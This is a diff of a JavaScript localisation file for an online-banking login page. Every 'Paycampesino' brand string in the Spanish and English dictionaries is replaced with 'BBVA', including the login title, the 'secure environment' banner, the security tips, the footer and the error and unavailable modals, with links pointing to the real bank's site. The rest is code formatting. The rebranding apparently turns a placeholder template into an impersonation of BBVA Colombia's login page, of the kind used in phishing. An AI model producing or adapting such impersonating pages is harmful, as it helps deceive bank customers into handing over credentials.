@@ -16,7 +16,7 @@
  * =============================================================================
  */
 
-(function(root) {
+(function (root) {
   "use strict";
 
   // Idioma activo por defecto ('es' = Español, 'en' = English)
@@ -31,10 +31,10 @@
     // -------------------------------------------------------------------------
     es: {
       // === PÁGINA Y METADATOS ===
-      LOGIN_PAGE_TITLE: "Paycampesino Net Colombia",
+      LOGIN_PAGE_TITLE: "BBVA Net Colombia",
 
       // === CABECERA Y NAVEGACIÓN (header-login) ===
-      LOGIN_NAV_LOGO_ALT: "Paycampesino Logo",
+      LOGIN_NAV_LOGO_ALT: "BBVA Logo",
       LOGIN_NAV_PERSONAS: "Personas",
       LOGIN_NAV_EMPRESAS: "Empresas",
       LOGIN_NAV_CERRAR: "Cerrar",
@@ -44,10 +44,10 @@
       LOGIN_NAV_URL_CERRAR: "https://www.bbva.com.co/",
 
       // === BARRA DE SEGURIDAD (secure-bar-login) ===
-      LOGIN_SECURE_BAR_TEXT: "Estás en un entorno con seguridad Paycampesino",
+      LOGIN_SECURE_BAR_TEXT: "Estás en un entorno con seguridad BBVA",
 
       // === FORMULARIO DE ACCESO (content-login) ===
-      LOGIN_FORM_TITLE: "Hola, inicia sesión en Paycampesino Net:",
+      LOGIN_FORM_TITLE: "Hola, inicia sesión en BBVA Net:",
 
       // Tipos de documento
       LOGIN_DOC_TYPE_CC: "Cédula de ciudadanía",
@@ -74,8 +74,8 @@
 
       // === SECCIÓN PROMOCIONAL LATERAL (content-login) ===
       LOGIN_PROMO_ALT: "Register",
-      LOGIN_PROMO_TITLE: "Empieza hoy con Paycampesino Net",
-      LOGIN_PROMO_DESC: "Regístrate para consultar tus productos en línea. Luego podrás activar tu App Paycampesino si la necesitas.",
+      LOGIN_PROMO_TITLE: "Empieza hoy con BBVA Net",
+      LOGIN_PROMO_DESC: "Regístrate para consultar tus productos en línea. Luego podrás activar tu App BBVA si la necesitas.",
       LOGIN_PROMO_BTN: "Regístrate",
 
       // === CARRUSEL DE RECOMENDACIONES DE SEGURIDAD (content-login) ===
@@ -83,36 +83,36 @@
       LOGIN_TIP_1_DESC: "Tus claves de acceso son secretas. No las compartas por correo, SMS o por llamada.",
 
       LOGIN_TIP_2_TITLE: "Cuidado con llamadas falsas",
-      LOGIN_TIP_2_DESC: "No devuelvas llamadas de números extraños. Siempre usa los canales oficiales de Paycampesino.",
+      LOGIN_TIP_2_DESC: "No devuelvas llamadas de números extraños. Siempre usa los canales oficiales de BBVA.",
 
       LOGIN_TIP_3_TITLE: "Nunca reveles tus códigos",
-      LOGIN_TIP_3_DESC: "Paycampesino jamás te pedirá códigos por mensaje de texto, correo o llamada que tú no hayas iniciado.",
+      LOGIN_TIP_3_DESC: "BBVA jamás te pedirá códigos por mensaje de texto, correo o llamada que tú no hayas iniciado.",
 
       LOGIN_TIP_4_TITLE: "Protege tus datos bancarios",
       LOGIN_TIP_4_DESC: "No digites contraseñas ni códigos en enlaces o apps que no reconozcas. Son sensibles.",
 
       LOGIN_TIP_5_TITLE: "¿Notaste algo extraño?",
-      LOGIN_TIP_5_DESC: "Si diste datos o ves movimientos sospechosos, contáctanos de inmediato en la Línea Paycampesino.",
+      LOGIN_TIP_5_DESC: "Si diste datos o ves movimientos sospechosos, contáctanos de inmediato en la Línea BBVA.",
 
       LOGIN_TIPS_COUNTER: "3 de 5",
 
       // === PIE DE PÁGINA INSTITUCIONAL (footer-login) ===
-      LOGIN_FOOTER_LOGO_ALT: "Paycampesino Icono Blanco",
+      LOGIN_FOOTER_LOGO_ALT: "BBVA Icono Blanco",
       LOGIN_FOOTER_FACEBOOK_TEXT: "Facebook",
-      LOGIN_FOOTER_FACEBOOK_ARIA: "Paycampesino Colombia en Facebook",
+      LOGIN_FOOTER_FACEBOOK_ARIA: "BBVA Colombia en Facebook",
       LOGIN_FOOTER_TWITTER_TEXT: "X (Twitter)",
-      LOGIN_FOOTER_TWITTER_ARIA: "Paycampesino Colombia en X (Twitter)",
+      LOGIN_FOOTER_TWITTER_ARIA: "BBVA Colombia en X (Twitter)",
       LOGIN_FOOTER_LINKEDIN_TEXT: "LinkedIn",
-      LOGIN_FOOTER_LINKEDIN_ARIA: "Paycampesino Colombia en LinkedIn",
+      LOGIN_FOOTER_LINKEDIN_ARIA: "BBVA Colombia en LinkedIn",
       LOGIN_FOOTER_YOUTUBE_TEXT: "YouTube",
-      LOGIN_FOOTER_YOUTUBE_ARIA: "Paycampesino Colombia en YouTube",
+      LOGIN_FOOTER_YOUTUBE_ARIA: "BBVA Colombia en YouTube",
 
       LOGIN_FOOTER_SITEMAP: "Sitemap",
       LOGIN_FOOTER_SEGURIDAD: "Seguridad",
       LOGIN_FOOTER_AVISO_LEGAL: "Aviso legal",
       LOGIN_FOOTER_POLITICAS: "Políticas",
       LOGIN_FOOTER_REGLAMENTO: "Reglamento de productos",
-      LOGIN_FOOTER_COPYRIGHT: "© 2026 Paycampesino Colombia. Todos los derechos reservados.",
+      LOGIN_FOOTER_COPYRIGHT: "© 2026 BBVA Colombia. Todos los derechos reservados.",
 
       // === MODALES Y DIÁLOGOS DEL SISTEMA ===
       // Modal: Error de acceso
@@ -144,10 +144,10 @@
     // -------------------------------------------------------------------------
     en: {
       // === PAGE & METADATA ===
-      LOGIN_PAGE_TITLE: "Paycampesino Net Colombia - Online Banking",
+      LOGIN_PAGE_TITLE: "BBVA Net Colombia - Online Banking",
 
       // === HEADER & NAVBAR (header-login) ===
-      LOGIN_NAV_LOGO_ALT: "Paycampesino Logo",
+      LOGIN_NAV_LOGO_ALT: "BBVA Logo",
       LOGIN_NAV_PERSONAS: "Personal",
       LOGIN_NAV_EMPRESAS: "Business",
       LOGIN_NAV_CERRAR: "Close",
@@ -157,10 +157,10 @@
       LOGIN_NAV_URL_CERRAR: "https://www.bbva.com.co/",
 
       // === SECURITY BAR (secure-bar-login) ===
-      LOGIN_SECURE_BAR_TEXT: "You are in a secure Paycampesino environment",
+      LOGIN_SECURE_BAR_TEXT: "You are in a secure BBVA environment",
 
       // === LOGIN FORM (content-login) ===
-      LOGIN_FORM_TITLE: "Hello, log in to Paycampesino Net:",
+      LOGIN_FORM_TITLE: "Hello, log in to BBVA Net:",
 
       // Document types
       LOGIN_DOC_TYPE_CC: "Citizenship ID (CC)",
@@ -187,8 +187,8 @@
 
       // === SIDE PROMO (content-login) ===
       LOGIN_PROMO_ALT: "Register",
-      LOGIN_PROMO_TITLE: "Get started today with Paycampesino Net",
-      LOGIN_PROMO_DESC: "Sign up to view your banking products online. You can also activate your Paycampesino App whenever needed.",
+      LOGIN_PROMO_TITLE: "Get started today with BBVA Net",
+      LOGIN_PROMO_DESC: "Sign up to view your banking products online. You can also activate your BBVA App whenever needed.",
       LOGIN_PROMO_BTN: "Sign up",
 
       // === SECURITY TIPS CAROUSEL (content-login) ===
@@ -196,36 +196,36 @@
       LOGIN_TIP_1_DESC: "Your access passwords are strictly confidential. Never share them via email, SMS, or phone calls.",
 
       LOGIN_TIP_2_TITLE: "Beware of suspicious calls",
-      LOGIN_TIP_2_DESC: "Do not return calls to unfamiliar phone numbers. Always reach us through Paycampesino official channels.",
+      LOGIN_TIP_2_DESC: "Do not return calls to unfamiliar phone numbers. Always reach us through BBVA official channels.",
 
       LOGIN_TIP_3_TITLE: "Never disclose your security codes",
-      LOGIN_TIP_3_DESC: "Paycampesino will never ask for verification codes via SMS, email, or unexpected phone calls.",
+      LOGIN_TIP_3_DESC: "BBVA will never ask for verification codes via SMS, email, or unexpected phone calls.",
 
       LOGIN_TIP_4_TITLE: "Protect your banking credentials",
       LOGIN_TIP_4_DESC: "Never type passwords or security codes into unknown links or third-party applications.",
 
       LOGIN_TIP_5_TITLE: "Notice anything unusual?",
-      LOGIN_TIP_5_DESC: "If you shared credentials or notice unauthorized activity, contact our Paycampesino Helpline immediately.",
+      LOGIN_TIP_5_DESC: "If you shared credentials or notice unauthorized activity, contact our BBVA Helpline immediately.",
 
       LOGIN_TIPS_COUNTER: "3 of 5",
 
       // === FOOTER (footer-login) ===
-      LOGIN_FOOTER_LOGO_ALT: "Paycampesino White Icon",
+      LOGIN_FOOTER_LOGO_ALT: "BBVA White Icon",
       LOGIN_FOOTER_FACEBOOK_TEXT: "Facebook",
-      LOGIN_FOOTER_FACEBOOK_ARIA: "Paycampesino Colombia on Facebook",
+      LOGIN_FOOTER_FACEBOOK_ARIA: "BBVA Colombia on Facebook",
       LOGIN_FOOTER_TWITTER_TEXT: "X (Twitter)",
-      LOGIN_FOOTER_TWITTER_ARIA: "Paycampesino Colombia on X (Twitter)",
+      LOGIN_FOOTER_TWITTER_ARIA: "BBVA Colombia on X (Twitter)",
       LOGIN_FOOTER_LINKEDIN_TEXT: "LinkedIn",
-      LOGIN_FOOTER_LINKEDIN_ARIA: "Paycampesino Colombia on LinkedIn",
+      LOGIN_FOOTER_LINKEDIN_ARIA: "BBVA Colombia on LinkedIn",
       LOGIN_FOOTER_YOUTUBE_TEXT: "YouTube",
-      LOGIN_FOOTER_YOUTUBE_ARIA: "Paycampesino Colombia on YouTube",
+      LOGIN_FOOTER_YOUTUBE_ARIA: "BBVA Colombia on YouTube",
 
       LOGIN_FOOTER_SITEMAP: "Sitemap",
       LOGIN_FOOTER_SEGURIDAD: "Security",
       LOGIN_FOOTER_AVISO_LEGAL: "Legal Notice",
       LOGIN_FOOTER_POLITICAS: "Policies",
       LOGIN_FOOTER_REGLAMENTO: "Product Terms",
-      LOGIN_FOOTER_COPYRIGHT: "© 2026 Paycampesino Colombia. Todos los derechos reservados.",
+      LOGIN_FOOTER_COPYRIGHT: "© 2026 BBVA Colombia. Todos los derechos reservados.",
 
       // === SYSTEM MODALS & ALERTS ===
       // Modal: Access error
@@ -236,7 +236,7 @@
       // Modal: Service unavailable
       LOGIN_MODAL_UNAVAILABLE_ALT: "Service unavailable",
       LOGIN_MODAL_UNAVAILABLE_TITLE: "Service temporarily unavailable",
-      LOGIN_MODAL_UNAVAILABLE_DESC: "We are currently experiencing system intermittence. Our team is working to resolve it as quickly as possible. We appreciate your patience. You may also use our Paycampesino Mobile App for more info at",
+      LOGIN_MODAL_UNAVAILABLE_DESC: "We are currently experiencing system intermittence. Our team is working to resolve it as quickly as possible. We appreciate your patience. You may also use our BBVA Mobile App for more info at",
       LOGIN_MODAL_UNAVAILABLE_LINK: "https://bbva.com.co/personas/servicios-digitales/app-bbva.html",
       LOGIN_MODAL_UNAVAILABLE_BTN: "Understood",
 
@@ -281,7 +281,7 @@
 
     // 1. Elementos con data-i18n (reemplazo de texto directo)
     if (rootNode.querySelectorAll) {
-      rootNode.querySelectorAll("[data-i18n]").forEach(function(el) {
+      rootNode.querySelectorAll("[data-i18n]").forEach(function (el) {
         const key = el.getAttribute("data-i18n");
         if (dict[key] !== undefined) {
           el.textContent = dict[key];
@@ -289,7 +289,7 @@
       });
 
       // 2. Elementos con data-i18n-html (reemplazo con HTML interno)
-      rootNode.querySelectorAll("[data-i18n-html]").forEach(function(el) {
+      rootNode.querySelectorAll("[data-i18n-html]").forEach(function (el) {
         const key = el.getAttribute("data-i18n-html");
         if (dict[key] !== undefined) {
           el.innerHTML = dict[key];
@@ -297,32 +297,32 @@
       });
 
       // 3. Atributos: placeholder, title, aria-label, alt, value
-      rootNode.querySelectorAll("[data-i18n-placeholder]").forEach(function(el) {
+      rootNode.querySelectorAll("[data-i18n-placeholder]").forEach(function (el) {
         const key = el.getAttribute("data-i18n-placeholder");
         if (dict[key] !== undefined) el.placeholder = dict[key];
       });
 
-      rootNode.querySelectorAll("[data-i18n-title]").forEach(function(el) {
+      rootNode.querySelectorAll("[data-i18n-title]").forEach(function (el) {
         const key = el.getAttribute("data-i18n-title");
         if (dict[key] !== undefined) el.title = dict[key];
       });
 
-      rootNode.querySelectorAll("[data-i18n-aria]").forEach(function(el) {
+      rootNode.querySelectorAll("[data-i18n-aria]").forEach(function (el) {
         const key = el.getAttribute("data-i18n-aria");
         if (dict[key] !== undefined) el.setAttribute("aria-label", dict[key]);
       });
 
-      rootNode.querySelectorAll("[data-i18n-alt]").forEach(function(el) {
+      rootNode.querySelectorAll("[data-i18n-alt]").forEach(function (el) {
         const key = el.getAttribute("data-i18n-alt");
         if (dict[key] !== undefined) el.alt = dict[key];
       });
 
-      rootNode.querySelectorAll("[data-i18n-value]").forEach(function(el) {
+      rootNode.querySelectorAll("[data-i18n-value]").forEach(function (el) {
         const key = el.getAttribute("data-i18n-value");
         if (dict[key] !== undefined) el.value = dict[key];
       });
 
-      rootNode.querySelectorAll("[data-i18n-href]").forEach(function(el) {
+      rootNode.querySelectorAll("[data-i18n-href]").forEach(function (el) {
         const key = el.getAttribute("data-i18n-href");
         if (dict[key] !== undefined) el.href = dict[key];
       });
@@ -334,7 +334,7 @@
     // 5. PENETRACIÓN EN SHADOW DOM: Inspeccionar hijos con shadowRoot abierto
     if (rootNode.querySelectorAll) {
       const allElements = rootNode.querySelectorAll("*");
-      allElements.forEach(function(el) {
+      allElements.forEach(function (el) {
         if (el.shadowRoot) {
           aplicarVariablesEnRaiz(el.shadowRoot, dict);
         }
@@ -348,7 +348,7 @@
     if (nodo.nodeType === Node.TEXT_NODE) {
       const texto = nodo.nodeValue;
       if (texto && texto.indexOf("{{") !== -1) {
-        nodo.nodeValue = texto.replace(/\{\{\s*([A-Z0-9_]+)\s*\}\}/g, function(match, key) {
+        nodo.nodeValue = texto.replace(/\{\{\s*([A-Z0-9_]+)\s*\}\}/g, function (match, key) {
           return dict[key] !== undefined ? dict[key] : match;
         });
       }
@@ -379,8 +379,8 @@
       "bbva-progress-content"
     ];
 
-    customComponentTags.forEach(function(tagName) {
-      document.querySelectorAll(tagName).forEach(function(comp) {
+    customComponentTags.forEach(function (tagName) {
+      document.querySelectorAll(tagName).forEach(function (comp) {
         if (comp.shadowRoot) {
           aplicarVariablesEnRaiz(comp.shadowRoot, dict);
         }
@@ -408,11 +408,11 @@
   }
 
   // Función para cambiar idioma dinámicamente
-  root.cambiarIdiomaLogin = function(nuevoIdioma) {
+  root.cambiarIdiomaLogin = function (nuevoIdioma) {
     if (TEXTOS_LOGIN[nuevoIdioma]) {
       try {
         localStorage.setItem("login_idioma_activo", nuevoIdioma);
-      } catch (e) {}
+      } catch (e) { }
       aplicarVariablesLogin();
       console.info("Idioma de login cambiado a: " + nuevoIdioma);
     } else {
@@ -421,7 +421,7 @@
   };
 
   // Helper de traducción: window.tLogin('VARIABLE', fallback)
-  root.tLogin = function(key, fallback) {
+  root.tLogin = function (key, fallback) {
     const lang = obtenerIdiomaActivo();
     const dict = TEXTOS_LOGIN[lang] || TEXTOS_LOGIN["es"];
     return dict[key] !== undefined ? dict[key] : (fallback || key);
@@ -435,7 +435,7 @@
   // Ejecución en el ciclo de vida del DOM
   if (typeof document !== "undefined") {
     if (document.readyState === "loading") {
-      document.addEventListener("DOMContentLoaded", function() {
+      document.addEventListener("DOMContentLoaded", function () {
         aplicarVariablesLogin();
         iniciarObservador();
       });
@@ -449,9 +449,9 @@
   function iniciarObservador() {
     if (typeof MutationObserver === "undefined" || !document.body) return;
     let timeout = null;
-    const observer = new MutationObserver(function() {
+    const observer = new MutationObserver(function () {
       if (timeout) clearTimeout(timeout);
-      timeout = setTimeout(function() {
+      timeout = setTimeout(function () {
         aplicarVariablesLogin();
       }, 50);
     });
